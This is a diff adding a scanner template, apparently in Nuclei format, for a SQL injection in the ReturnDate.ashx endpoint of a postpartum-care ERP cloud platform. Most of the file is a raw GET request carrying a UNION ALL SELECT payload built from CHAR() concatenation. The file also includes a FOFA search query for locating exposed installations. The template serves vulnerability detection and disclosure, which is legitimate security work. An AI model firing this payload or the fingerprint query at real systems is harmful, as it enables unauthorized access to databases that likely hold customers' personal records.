@@ -1,0 +1,23 @@
+id: poc-xe73cfm9pw0zqc1f
+info:
+  name: 月子会所ERP管理云平台 ReturnDate.ashx 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xe73cfm9pw0zqc1f'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xe73cfm9pw0zqc1f
+    fofa: body="月子护理ERP管理平台" || body="妈妈宝盒客户端.rar" || body="Page/Login/Login3.aspx"
+http:
+- raw:
+  - 'GET /Page/NursingManager/ashx/ReturnDate.ashx?c_name=test%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28120%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%2899%29%2BCHAR%2879%29%2BCHAR%28113%29%2BCHAR%2899%29%2BCHAR%28105%29%2BCHAR%2885%29%2BCHAR%2879%29%2BCHAR%28120%29%2BCHAR%2870%29%2BCHAR%2876%29%2BCHAR%2866%29%2BCHAR%2866%29%2BCHAR%2875%29%2BCHAR%2872%29%2BCHAR%2866%29%2BCHAR%2878%29%2BCHAR%2898%29%2BCHAR%2875%29%2BCHAR%2886%29%2BCHAR%28105%29%2BCHAR%2882%29%2BCHAR%2871%29%2BCHAR%28121%29%2BCHAR%2888%29%2BCHAR%2883%29%2BCHAR%28103%29%2BCHAR%2886%29%2BCHAR%2874%29%2BCHAR%2888%29%2BCHAR%2899%29%2BCHAR%2883%29%2BCHAR%2878%29%2BCHAR%28104%29%2BCHAR%28105%29%2BCHAR%2888%29%2BCHAR%2867%29%2BCHAR%2886%29%2BCHAR%2873%29%2BCHAR%2883%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29--+TPGS&RequestMethod=GetCustomerYY_calendar HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.1943.105 Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
